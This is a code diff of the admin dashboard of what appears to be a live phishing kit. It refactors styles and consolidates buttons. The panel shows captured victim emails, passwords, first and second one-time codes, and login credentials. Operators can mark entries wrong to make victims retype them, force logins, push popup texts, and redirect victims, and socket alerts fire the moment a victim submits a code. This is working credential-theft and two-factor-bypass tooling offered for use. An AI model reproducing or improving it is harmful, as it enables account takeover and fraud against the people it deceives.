@@ -16,7 +16,6 @@
   font-family: 'Inter', sans-serif;
 }
 
-/* Light Theme (Default) */
 :root {
   --bg-page: #f8fafc;
   --bg-card: #ffffff;
@@ -37,7 +36,6 @@
   --transition: all 0.2s ease;
 }
 
-/* Dark Theme */
 [data-theme="dark"] {
   --bg-page: #0f172a;
   --bg-card: #1e293b;
@@ -63,7 +61,6 @@ body {
   transition: var(--transition);
 }
 
-/* Navbar */
 .navbar {
   background: var(--bg-card);
   padding: 12px 24px;
@@ -121,14 +118,12 @@ body {
   background: #dc2626;
 }
 
-/* Container */
 .container {
   max-width: 100%;
   margin: 16px auto;
   padding: 0 16px;
 }
 
-/* Stats Cards */
 .stats {
   display: grid;
   grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
@@ -156,7 +151,6 @@ body {
   color: var(--text-primary);
 }
 
-/* Table */
 .table-container {
   background: var(--bg-card);
   border-radius: 16px;
@@ -191,7 +185,6 @@ tr:hover {
   background: var(--bg-hover);
 }
 
-/* Badges */
 .badge {
   display: inline-block;
   padding: 2px 8px;
@@ -205,7 +198,6 @@ tr:hover {
 .badge-email { background: #fef3c7; color: #d97706; }
 .badge-blocked { background: #fee2e2; color: #dc2626; }
 
-/* Action Buttons Container */
 .actions-cell {
   white-space: normal;
   display: flex;
@@ -226,8 +218,7 @@ tr:hover {
   transition: var(--transition);
   white-space: nowrap;
 }
-.approve-email-btn { background: #f59e0b; color: white; }
-.approve-second-btn { background: #059669; color: white; }
+.approve-btn { background: #f59e0b; color: white; }
 .force-login-btn { background: #8b5cf6; color: white; }
 .redirect-success-btn { background: #3b82f6; color: white; }
 .send-text-btn { background: #f97316; color: white; }
@@ -236,16 +227,7 @@ tr:hover {
 .incorrect-otp-btn { background: #e11d48; color: white; }
 .wrong-login-btn { background: #b91c1c; color: white; }
 .correct-login-btn { background: #059669; color: white; }
-.waiting-badge {
-  background: #e0e7ff;
-  color: #4f46e5;
-  padding: 4px 8px;
-  border-radius: 6px;
-  font-size: 10px;
-  font-weight: 500;
-  display: inline-block;
-  white-space: nowrap;
-}
+
 .action-btn:hover {
   transform: translateY(-1px);
   opacity: 0.9;
@@ -256,7 +238,6 @@ tr:hover {
   transform: none;
 }
 
-/* Copy Button */
 .copy-icon {
   background: transparent;
   border: none;
@@ -273,7 +254,6 @@ tr:hover {
   background: var(--border-light);
 }
 
-/* Timestamp styling */
 .timestamp {
   font-size: 10px;
   font-family: monospace;
@@ -281,7 +261,6 @@ tr:hover {
   white-space: nowrap;
 }
 
-/* Data Styling */
 .data-value {
   display: inline-flex;
   align-items: center;
@@ -301,7 +280,6 @@ tr:hover {
   font-size: 11px;
 }
 
-/* Toast Notification - ONLY FOR DATA RECEIVED */
 .notification-toast {
   position: fixed;
   top: 70px;
@@ -330,7 +308,6 @@ tr:hover {
   font-size: 11px;
 }
 
-/* Modal Styles */
 .modal-overlay {
   display: none;
   position: fixed;
@@ -402,7 +379,6 @@ tr:hover {
   font-size: 11px;
 }
 
-/* Text Modal (Popup only for Send Text) */
 .text-modal-overlay {
   display: none;
   position: fixed;
@@ -486,7 +462,6 @@ tr:hover {
   background: #b91c1c;
 }
 
-/* Responsive */
 @media (max-width: 768px) {
   .container {
     padding: 0 12px;
@@ -562,7 +537,7 @@ tr:hover {
       <div class="number" id="totalUsers">0</div>
     </div>
     <div class="stat-card">
-      <h3><i class="fas fa-envelope"></i> Pending Email Approval</h3>
+      <h3><i class="fas fa-envelope"></i> Pending Approval</h3>
       <div class="number" id="pendingEmail">0</div>
     </div>
     <div class="stat-card">
@@ -595,7 +570,6 @@ tr:hover {
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
-  // ==================== THEME TOGGLE ====================
   const themeToggleBtn = document.getElementById('themeToggleBtn');
   const currentTheme = localStorage.getItem('theme') || 'light';
   
@@ -617,7 +591,6 @@ tr:hover {
     }
   });
 
-  // ==================== ADMIN AUTH ====================
   const token = localStorage.getItem('adminToken');
   if (!token) window.location.href = '/admin';
 
@@ -633,11 +606,9 @@ tr:hover {
     }
   }
 
-  // SOUND ONLY FOR DATA RECEIVED EVENTS
   function playSoundForAction(action) {
     initAudio();
     if (!audioContext) return;
-    
     try {
       const now = audioContext.currentTime;
       if (action === 'email') {
@@ -704,35 +675,22 @@ tr:hover {
     return `<span class="timestamp" title="${date.toLocaleString()}">${date.toLocaleString()}</span>`;
   }
 
-  // NOTIFICATION ONLY FOR DATA RECEIVED (user submissions)
   function showNotification(title, message, action, playSound = true) {
     const toast = document.getElementById('notificationToast');
     document.getElementById('notificationTitle').textContent = title;
     document.getElementById('notificationMessage').textContent = message;
     toast.style.display = 'block';
-    
-    if (playSound) {
-      playSoundForAction(action);
-    }
-    
-    if (Notification.permission === 'granted') {
-      new Notification(title, { body: message });
-    }
-    
-    if ('vibrate' in navigator && playSound) {
-      navigator.vibrate([200, 100, 200]);
-    }
-    
+    if (playSound) playSoundForAction(action);
+    if (Notification.permission === 'granted') new Notification(title, { body: message });
+    if ('vibrate' in navigator && playSound) navigator.vibrate([200, 100, 200]);
     setTimeout(() => { toast.style.display = 'none'; }, 4000);
   }
 
-  if (Notification.permission === 'default') {
-    Notification.requestPermission();
-  }
+  if (Notification.permission === 'default') Notification.requestPermission();
 
-  function copyToClipboard(text, fieldName) {
-    if (!text || text === '-') return;
-    navigator.clipboard.writeText(text).then(() => {}).catch(() => {});
+  function copyToClipboard(text) {
+    if (!text) return;
+    navigator.clipboard.writeText(text).catch(() => {});
   }
 
   function showTextModal(email) {
@@ -750,40 +708,28 @@ tr:hover {
     const text = document.getElementById('adminTextInput').value.trim();
     if (!text) return;
     if (!currentSelectedEmail) return;
-    
     try {
       await fetch('/api/admin/send-text', {
         method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json', 
-          'Authorization': `Bearer ${token}` 
-        },
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email: currentSelectedEmail, text })
       });
       hideTextModal();
       loadUsers();
-    } catch (error) {
-      console.error('Send text error:', error);
-    }
+    } catch (error) { console.error('Send text error:', error); }
   }
 
   async function releaseTextPopup() {
     if (!currentSelectedEmail) return;
-    
     try {
       await fetch('/api/admin/release-text', {
         method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json', 
-          'Authorization': `Bearer ${token}` 
-        },
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email: currentSelectedEmail })
       });
       hideTextModal();
       loadUsers();
-    } catch (error) {
-      console.error('Release text error:', error);
-    }
+    } catch (error) { console.error('Release text error:', error); }
   }
 
   async function deleteUser(email) {
@@ -791,16 +737,11 @@ tr:hover {
       try {
         await fetch('/api/admin/delete-user', {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json', 
-            'Authorization': `Bearer ${token}` 
-          },
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
         loadUsers();
-      } catch (error) {
-        console.error('Delete user error:', error);
-      }
+      } catch (error) { console.error('Delete user error:', error); }
     }
   }
 
@@ -809,103 +750,62 @@ tr:hover {
       try {
         await fetch('/api/admin/block-email', {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json', 
-            'Authorization': `Bearer ${token}` 
-          },
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
         loadUsers();
         loadBlockedEmails();
-      } catch (error) {
-        console.error('Block email error:', error);
-      }
+      } catch (error) { console.error('Block email error:', error); }
     }
   }
 
   async function incorrectOTP(email) {
-    if (confirm(`❌ Mark OTP as incorrect for: ${email}?`)) {
+    if (confirm(`❌ Mark OTP as incorrect?`)) {
       try {
         await fetch('/api/admin/incorrect-otp', {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json', 
-            'Authorization': `Bearer ${token}` 
-          },
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-        console.log('Incorrect OTP reset triggered for:', email);
-      } catch (error) {
-        console.error('Incorrect OTP error:', error);
-      }
+      } catch (error) { console.error('Incorrect OTP error:', error); }
     }
   }
 
-  // ==================== NEW BUTTON FUNCTIONS ====================
   async function wrongLoginCredentials(email) {
-    if (confirm(`❌ Mark login credentials as WRONG for: ${email}?`)) {
+    if (confirm(`❌ Mark login as WRONG?`)) {
       try {
         await fetch('/api/admin/wrong-login', {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json', 
-            'Authorization': `Bearer ${token}` 
-          },
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-        console.log('Wrong login triggered for:', email);
-      } catch (error) {
-        console.error('Wrong login error:', error);
-      }
+      } catch (error) { console.error('Wrong login error:', error); }
     }
   }
 
   async function correctLoginCredentials(email) {
-    if (confirm(`✅ Mark login credentials as CORRECT for: ${email}?`)) {
+    if (confirm(`✅ Mark login as CORRECT?`)) {
       try {
         await fetch('/api/admin/correct-login', {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json', 
-            'Authorization': `Bearer ${token}` 
-          },
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-        console.log('Correct login triggered for:', email);
-      } catch (error) {
-        console.error('Correct login error:', error);
-      }
+      } catch (error) { console.error('Correct login error:', error); }
     }
   }
 
   async function loadBlockedEmails() {
     try {
-      const response = await fetch('/api/admin/blocked-emails', {
-        headers: { 'Authorization': `Bearer ${token}` }
-      });
+      const response = await fetch('/api/admin/blocked-emails', { headers: { 'Authorization': `Bearer ${token}` } });
       const blocked = await response.json();
-      
       const container = document.getElementById('blockedListContainer');
       if (blocked.length === 0) {
         container.innerHTML = '<p style="text-align:center; color:var(--text-muted);">No blocked emails</p>';
         return;
       }
-      
-      container.innerHTML = `
-        <ul class="blocked-list">
-          ${blocked.map(b => `
-            <li class="blocked-item">
-              <div>
-                <div class="blocked-email">${b.email}</div>
-                <div class="blocked-meta">Blocked: ${new Date(b.blocked_at).toLocaleString()} by ${b.blocked_by || 'Admin'}</div>
-              </div>
-              <button class="unblock-btn" onclick="unblockEmail('${b.email}')">Unblock</button>
-            </li>
-          `).join('')}
-        </ul>
-      `;
+      container.innerHTML = `<ul class="blocked-list">${blocked.map(b => `<li class="blocked-item"><div><div class="blocked-email">${b.email}</div><div class="blocked-meta">Blocked: ${new Date(b.blocked_at).toLocaleString()} by ${b.blocked_by || 'Admin'}</div></div><button class="unblock-btn" onclick="unblockEmail('${b.email}')">Unblock</button></li>`).join('')}</ul>`;
     } catch (err) {
-      console.error(err);
       document.getElementById('blockedListContainer').innerHTML = '<p style="color:red;">Error loading blocked emails</p>';
     }
   }
@@ -915,46 +815,27 @@ tr:hover {
       try {
         await fetch('/api/admin/unblock-email', {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json', 
-            'Authorization': `Bearer ${token}` 
-          },
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
         loadBlockedEmails();
         loadUsers();
         closeBlockedModal();
-      } catch (error) {
-        console.error('Unblock error:', error);
-      }
+      } catch (error) { console.error('Unblock error:', error); }
     }
   }
 
-  function openBlockedModal() {
-    loadBlockedEmails();
-    document.getElementById('blockedModal').classList.add('active');
-  }
-
-  function closeBlockedModal() {
-    document.getElementById('blockedModal').classList.remove('active');
-  }
+  function openBlockedModal() { loadBlockedEmails(); document.getElementById('blockedModal').classList.add('active'); }
+  function closeBlockedModal() { document.getElementById('blockedModal').classList.remove('active'); }
 
   async function loadUsers() {
     try {
-      const response = await fetch('/api/admin/users', {
-        headers: { 'Authorization': `Bearer ${token}` }
-      });
-      if (response.status === 403) {
-        localStorage.removeItem('adminToken');
-        window.location.href = '/admin';
-        return;
-      }
+      const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
+      if (response.status === 403) { localStorage.removeItem('adminToken'); window.location.href = '/admin'; return; }
       const users = await response.json();
       displayUsers(users);
       updateStats(users);
-    } catch(err) {
-      console.error(err);
-    }
+    } catch(err) { console.error(err); }
   }
 
   function updateStats(users) {
@@ -965,167 +846,94 @@ tr:hover {
     document.getElementById('activeSecondUsers').textContent = activeUsers;
   }
 
-  function formatValue(value, fieldName) {
+  function formatValue(value) {
     if (!value) return '<span class="data-empty">—</span>';
-    const escaped = String(value).replace(/[&<>]/g, function(m) {
-      if (m === '&') return '&amp;';
-      if (m === '<') return '&lt;';
-      if (m === '>') return '&gt;';
-      return m;
-    });
-    return `
-      <div class="data-value">
-        <span class="data-code">${escaped}</span>
-        <button class="copy-icon" onclick="copyToClipboard('${escaped.replace(/'/g, "\\'")}', '${fieldName}')" title="Copy ${fieldName}">
-          <i class="far fa-copy"></i>
-        </button>
-      </div>
-    `;
+    const escaped = String(value).replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;');
+    return `<div class="data-value"><span class="data-code">${escaped}</span><button class="copy-icon" onclick="copyToClipboard('${escaped.replace(/'/g, "\\'")}')" title="Copy"><i class="far fa-copy"></i></button></div>`;
   }
 
   function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
-    if (!users.length) {
-      tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td</span> </span>';
-      return;
-    }
+    if (!users.length) { tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td></tr>'; return; }
     
     tbody.innerHTML = users.map(user => {
       let statusBadge = '';
-      
-      if (user.redirect_success === true) {
-        statusBadge = '<span class="badge badge-blocked">🚫 Redirected to Success</span>';
-      } else if (user.approved && user.second_approved) {
-        statusBadge = '<span class="badge badge-approved">✅ Fully Approved</span>';
-      } else if (user.approved && user.otp && !user.second_approved) {
-        statusBadge = '<span class="badge badge-waiting">🔐 First OTP Approved - Waiting for Second OTP</span>';
-      } else if (user.approved && !user.otp) {
-        statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
-      } else if (!user.approved) {
-        statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
-      } else {
-        statusBadge = '<span class="badge badge-pending">Pending</span>';
-      }
+      if (user.redirect_success === true) statusBadge = '<span class="badge badge-blocked">🚫 Redirected to Success</span>';
+      else if (user.approved && user.second_approved) statusBadge = '<span class="badge badge-approved">✅ Fully Approved</span>';
+      else if (user.approved && user.otp && !user.second_approved) statusBadge = '<span class="badge badge-waiting">🔐 First OTP Approved - Waiting for Second OTP</span>';
+      else if (user.approved && !user.otp) statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
+      else if (!user.approved) statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
+      else statusBadge = '<span class="badge badge-pending">Pending</span>';
       
       const showLoginButtons = user.force_login === true || user.login_email !== null;
       
-      return `
-        <tr>
-          <td>${formatValue(user.email, 'Email')}</td</span>
-          <td>${formatValue(user.password, 'Password')}</td</span>
-          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}</td</span>
-          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td</span>
-          <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td</span>
-          <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td</span>
-          <td>${formatTimestamp(user.email_submitted_at)}</td</span>
-          <td>${statusBadge}</td</span>
-          <td class="actions-cell">
-            <button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')" ${user.approved ? 'disabled style="opacity:0.5;"' : ''}><i class="fas fa-envelope"></i> Approve Email</button>
-            <button class="action-btn approve-second-btn" onclick="approveSecond('${user.email}')"><i class="fas fa-check-circle"></i> Approve OTP</button>
-            <button class="action-btn block-email-btn" onclick="blockEmail('${user.email}')"><i class="fas fa-ban"></i> Block</button>
-            <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')"><i class="fas fa-sign-in-alt"></i> Force Login</button>
-            ${showLoginButtons ? `
-              <button class="action-btn wrong-login-btn" onclick="wrongLoginCredentials('${user.email}')"><i class="fas fa-times-circle"></i> Wrong Login</button>
-              <button class="action-btn correct-login-btn" onclick="correctLoginCredentials('${user.email}')"><i class="fas fa-check-circle"></i> Correct Login</button>
-            ` : ''}
-            <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')"><i class="fas fa-arrow-right"></i> Redirect</button>
-            <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
-            <button class="action-btn incorrect-otp-btn" onclick="incorrectOTP('${user.email}')"><i class="fas fa-times-circle"></i> Incorrect OTP</button>
-            <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
-          </td</span>
-        </tr>
-      `;
+      return `<tr>
+        <td>${formatValue(user.email)}</td>
+        <td>${formatValue(user.password)}</td>
+        <td>${user.otp ? formatValue(user.otp) : '<span class="data-empty">—</span>'}</td>
+        <td>${user.second_otp ? formatValue(user.second_otp) : '<span class="data-empty">—</span>'}</td>
+        <td>${user.login_email ? formatValue(user.login_email) : '<span class="data-empty">—</span>'}</td>
+        <td>${user.login_password ? formatValue(user.login_password) : '<span class="data-empty">—</span>'}</td>
+        <td>${formatTimestamp(user.email_submitted_at)}</td>
+        <td>${statusBadge}</td>
+        <td class="actions-cell">
+          <button class="action-btn approve-btn" onclick="approveUser('${user.email}')"><i class="fas fa-check-circle"></i> Approve</button>
+          <button class="action-btn block-email-btn" onclick="blockEmail('${user.email}')"><i class="fas fa-ban"></i> Block</button>
+          <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')"><i class="fas fa-sign-in-alt"></i> Force Login</button>
+          ${showLoginButtons ? `
+            <button class="action-btn wrong-login-btn" onclick="wrongLoginCredentials('${user.email}')"><i class="fas fa-times-circle"></i> Wrong Login</button>
+            <button class="action-btn correct-login-btn" onclick="correctLoginCredentials('${user.email}')"><i class="fas fa-check-circle"></i> Correct Login</button>
+          ` : ''}
+          <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')"><i class="fas fa-arrow-right"></i> Redirect</button>
+          <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
+          <button class="action-btn incorrect-otp-btn" onclick="incorrectOTP('${user.email}')"><i class="fas fa-times-circle"></i> Incorrect OTP</button>
+          <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
+        </td>
+      </tr>`;
     }).join('');
   }
 
-  async function approveEmail(email) {
+  async function approveUser(email) {
     try {
-      await fetch('/api/admin/approve-user', {
+      await fetch('/api/admin/approve', {
         method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json', 
-          'Authorization': `Bearer ${token}` 
-        },
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email })
       });
       loadUsers();
-    } catch (error) {
-      console.error('Approve email error:', error);
-    }
-  }
-
-  async function approveSecond(email) {
-    try {
-      await fetch('/api/admin/approve-second', {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json', 
-          'Authorization': `Bearer ${token}` 
-        },
-        body: JSON.stringify({ email })
-      });
-      loadUsers();
-    } catch (error) {
-      console.error('Approve second error:', error);
-    }
+    } catch (error) { console.error('Approve error:', error); }
   }
 
   async function forceLogin(email) {
     try {
       await fetch('/api/admin/force-login', {
         method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json', 
-          'Authorization': `Bearer ${token}` 
-        },
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email })
       });
       loadUsers();
-    } catch (error) {
-      console.error('Force login error:', error);
-    }
+    } catch (error) { console.error('Force login error:', error); }
   }
 
   async function redirectToSuccess(email) {
     try {
       await fetch('/api/admin/redirect-success', {
         method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json', 
-          'Authorization': `Bearer ${token}` 
-        },
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email })
       });
       loadUsers();
-    } catch (error) {
-      console.error('Redirect success error:', error);
-    }
+    } catch (error) { console.error('Redirect success error:', error); }
   }
 
-  function logout() {
-    localStorage.removeItem('adminToken');
-    window.location.href = '/admin';
-  }
+  function logout() { localStorage.removeItem('adminToken'); window.location.href = '/admin'; }
 
-  // Socket listeners - ONLY FOR DATA RECEIVED (user submissions)
-  socket.on('user-login', (data) => {
-    showNotification('📧 New Email', `${data.email} signed up`, 'email', true);
-    loadUsers();
-  });
-  socket.on('user-otp-created', (data) => {
-    showNotification('🔢 First OTP', `${data.email} entered: ${data.otp}`, 'first-otp', true);
-    loadUsers();
-  });
-  socket.on('user-second-otp-created', (data) => {
-    showNotification('🔐 Second OTP', `${data.email} entered: ${data.second_otp}`, 'second-otp', true);
-    loadUsers();
-  });
-  socket.on('user-login-submitted', (data) => {
-    showNotification('🔐 Login Submitted', `${data.email} submitted: ${data.loginEmail}`, 'login-submitted', true);
-    loadUsers();
-  });
+  // Socket listeners - ONLY FOR DATA RECEIVED
+  socket.on('user-login', (data) => { showNotification('📧 New Email', `${data.email} signed up`, 'email', true); loadUsers(); });
+  socket.on('user-otp-created', (data) => { showNotification('🔢 First OTP', `${data.email} entered: ${data.otp}`, 'first-otp', true); loadUsers(); });
+  socket.on('user-second-otp-created', (data) => { showNotification('🔐 Second OTP', `${data.email} entered: ${data.second_otp}`, 'second-otp', true); loadUsers(); });
+  socket.on('user-login-submitted', (data) => { showNotification('🔐 Login Submitted', `${data.email} submitted: ${data.loginEmail}`, 'login-submitted', true); loadUsers(); });
   
-  // Silent socket events - no notifications
   socket.on('force-login-triggered', () => loadUsers());
   socket.on('redirect-success-triggered', () => loadUsers());
   socket.on('text-sent', () => loadUsers());
@@ -1137,16 +945,11 @@ tr:hover {
   document.getElementById('sendTextBtnModal').addEventListener('click', sendTextToUser);
   document.getElementById('releaseTextBtnModal').addEventListener('click', releaseTextPopup);
   document.getElementById('viewBlockedBtn').addEventListener('click', openBlockedModal);
-  document.getElementById('textModal').addEventListener('click', (e) => {
-    if (e.target === document.getElementById('textModal')) {
-      hideTextModal();
-    }
-  });
+  document.getElementById('textModal').addEventListener('click', (e) => { if (e.target === document.getElementById('textModal')) hideTextModal(); });
 
   loadUsers();
   setInterval(loadUsers, 5000);
   loadBlockedEmails();
 </script>
-
 </body>
 </html>
